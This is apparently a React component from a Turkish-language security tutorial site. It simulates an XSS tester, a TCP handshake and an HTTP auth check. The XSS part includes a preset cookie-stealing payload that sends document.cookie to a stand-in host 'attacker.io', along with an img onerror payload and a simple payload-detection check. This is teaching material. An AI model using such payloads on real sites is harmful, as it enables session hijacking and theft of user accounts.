import React, { useState } from 'react';

interface InteractiveCyberSandboxProps {
  topicSlug: string;
  accentColor?: string;
}

export const InteractiveCyberSandbox: React.FC<InteractiveCyberSandboxProps> = ({
  topicSlug,
  accentColor = '#B7FF00'
}) => {
  // XSS Sandbox State
  const [xssInput, setXssInput] = useState("<script>alert('XSS_TRIGGERED')</script>");
  const [xssMode, setXssMode] = useState<'vulnerable' | 'safe'>('vulnerable');

  // TCP Handshake State
  const [tcpStep, setTcpStep] = useState<number>(1);

  // HTTP Inspector State
  const [httpMethod, setHttpMethod] = useState<'GET' | 'POST'>('GET');
  const [httpEndpoint, setHttpEndpoint] = useState('/api/v1/user/profile');
  const [hasAuthToken, setHasAuthToken] = useState(true);

  if (topicSlug === 'xss') {
    const isPayload = xssInput.includes('<script>') || xssInput.includes('onerror=') || xssInput.includes('onload=');
    const isAttacked = xssMode === 'vulnerable' && isPayload;

    return (
      <div className="cyber-sandbox-card" style={{ '--box-accent': accentColor } as React.CSSProperties}>
        <div className="sandbox-header">
          <div className="sandbox-title-wrap">
            <span className="status-dot status-dot--pulse" />
            <span className="mono-label">LIVE_SANDBOX // XSS PAYLOAD TESTER</span>
          </div>
          <div className="sandbox-mode-toggle mono-label">
            <button
              type="button"
              className={`mode-btn ${xssMode === 'vulnerable' ? 'is-vuln' : ''}`}
              onClick={() => setXssMode('vulnerable')}
            >
              [ VULNERABLE: innerHTML ]
            </button>
            <button
              type="button"
              className={`mode-btn ${xssMode === 'safe' ? 'is-safe' : ''}`}
              onClick={() => setXssMode('safe')}
            >
              [ SAFE: textContent ]
            </button>
          </div>
        </div>

        <div className="sandbox-body">
          <div className="sandbox-input-col">
            <label className="sandbox-label mono-label">SALDIRGAN GİRDİSİ (PAYLOAD İNPUT):</label>
            <div className="input-row">
              <input
                type="text"
                value={xssInput}
                onChange={(e) => setXssInput(e.target.value)}
                className="sandbox-text-input mono-label"
                placeholder="Payload yazın..."
              />
              <div className="quick-presets mono-label">
                <button type="button" onClick={() => setXssInput("<script>fetch('//attacker.io/?c='+document.cookie)</script>")}>
                  [ Cookie Stealer ]
                </button>
                <button type="button" onClick={() => setXssInput("<img src=x onerror=alert('DOM_XSS')>")}>
                  [ Img Error ]
                </button>
              </div>
            </div>
          </div>

          <div className="sandbox-output-col">
            <div className="output-screen-frame">
              <div className="screen-bar mono-label">
                <span className="screen-dot dot-red" />
                <span className="screen-dot dot-yellow" />
                <span className="screen-dot dot-green" />
                <span className="screen-url">https://target-bank.internal/search</span>
              </div>

              <div className="screen-content">
                <p className="screen-text-label mono-label">Arama Çıktısı:</p>
                {xssMode === 'vulnerable' ? (
                  <div className={`rendered-dom-box ${isAttacked ? 'is-compromised' : ''}`}>
                    {isAttacked ? (
                      <div className="xss-alert-box">
                        <span className="alert-badge mono-label">⚠ JAVASCRIPT KODU ÇALIŞTI (XSS EXECUTION)</span>
                        <code className="alert-code mono-label">document.cookie = "session_token=9a8b7c6d5e; user=admin"</code>
                        <span className="alert-warning mono-label">Saldırgan tarayıcı yetkisiyle tam kontrol elde etti!</span>
                      </div>
                    ) : (
                      <span className="safe-render-text">{xssInput}</span>
                    )}
                  </div>
                ) : (
                  <div className="rendered-dom-box is-protected">
                    <span className="safe-badge mono-label">✓ OUTPUT ENCODING AKTİF (METİN OLARAK GÖRÜNDÜ)</span>
                    <p className="escaped-text mono-label">{xssInput}</p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (topicSlug === 'tcp-nedir' || topicSlug === 'network-nedir') {
    return (
      <div className="cyber-sandbox-card" style={{ '--box-accent': accentColor } as React.CSSProperties}>
        <div className="sandbox-header">
          <div className="sandbox-title-wrap">
            <span className="status-dot status-dot--pulse" />
            <span className="mono-label">LIVE_SANDBOX // TCP 3-WAY HANDSHAKE SİMÜLATÖRÜ</span>
          </div>
          <span className="mono-label">ADIM {tcpStep} / 3</span>
        </div>

        <div className="handshake-stepper-body">
          <div className="handshake-hosts-row">
            <div className={`host-node ${tcpStep >= 1 ? 'is-active-host' : ''}`}>
              <span className="host-icon mono-num">[CLIENT]</span>
              <span className="host-ip mono-label">192.168.1.50</span>
            </div>

            <div className="handshake-packet-lane">
              {tcpStep === 1 && (
                <div className="packet-anim packet--right">
                  <span className="packet-flag mono-label">SYN (Seq=100)</span>
                  <span className="packet-arrow">────────▶</span>
                </div>
              )}
              {tcpStep === 2 && (
                <div className="packet-anim packet--left">
                  <span className="packet-arrow">◀────────</span>
                  <span className="packet-flag mono-label">SYN-ACK (Seq=300, Ack=101)</span>
                </div>
              )}
              {tcpStep === 3 && (
                <div className="packet-anim packet--right">
                  <span className="packet-flag mono-label">ACK (Ack=301) [ESTABLISHED]</span>
                  <span className="packet-arrow">────────▶</span>
                </div>
              )}
            </div>

            <div className={`host-node ${tcpStep >= 2 ? 'is-active-host' : ''}`}>
              <span className="host-icon mono-num">[SERVER]</span>
              <span className="host-ip mono-label">142.250.180.206 : 443</span>
            </div>
          </div>

          <div className="handshake-controls-row">
            <button
              type="button"
              className="cta-secondary"
              onClick={() => setTcpStep(tcpStep === 3 ? 1 : tcpStep + 1)}
            >
              <span>{tcpStep === 3 ? 'BAĞLANTIYI SIFIRLA ↺' : 'SONRAKİ PAKETİ GÖNDER →'}</span>
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (topicSlug === 'client-server' || topicSlug === 'same-origin-policy') {
    return (
      <div className="cyber-sandbox-card" style={{ '--box-accent': accentColor } as React.CSSProperties}>
        <div className="sandbox-header">
          <div className="sandbox-title-wrap">
            <span className="status-dot status-dot--pulse" />
            <span className="mono-label">LIVE_SANDBOX // HTTP HEADER &amp; AUTH INSPECTOR</span>
          </div>
        </div>

        <div className="http-inspector-body">
          <div className="http-request-builder">
            <div className="req-line">
              <select
                value={httpMethod}
                onChange={(e) => setHttpMethod(e.target.value as any)}
                className="method-select mono-label"
              >
                <option value="GET">GET</option>
                <option value="POST">POST</option>
              </select>
              <input
                type="text"
                value={httpEndpoint}
                onChange={(e) => setHttpEndpoint(e.target.value)}
                className="endpoint-input mono-label"
              />
            </div>

            <div className="auth-toggle-line mono-label">
              <label className="auth-toggle-label">
                <input
                  type="checkbox"
                  checked={hasAuthToken}
                  onChange={(e) => setHasAuthToken(e.target.checked)}
                />
                <span>Authorization: Bearer eyJhbGciOi...</span>
              </label>
            </div>
          </div>

          <div className="http-response-viewer">
            <div className="res-status-line mono-label">
              <span className="res-title">SERVER RESPONSE:</span>
              <span className={`status-code ${hasAuthToken ? 'status-200' : 'status-401'}`}>
                {hasAuthToken ? 'HTTP/1.1 200 OK' : 'HTTP/1.1 401 Unauthorized'}
              </span>
            </div>

            <pre className="res-body-code mono-label">
              {hasAuthToken
                ? JSON.stringify({ status: 'success', user_id: 1337, role: 'admin', balance: 50000 }, null, 2)
                : JSON.stringify({ error: 'AccessDenied', message: 'Geçersiz veya eksik JWT token.' }, null, 2)}
            </pre>
          </div>
        </div>
      </div>
    );
  }

  return null;
};
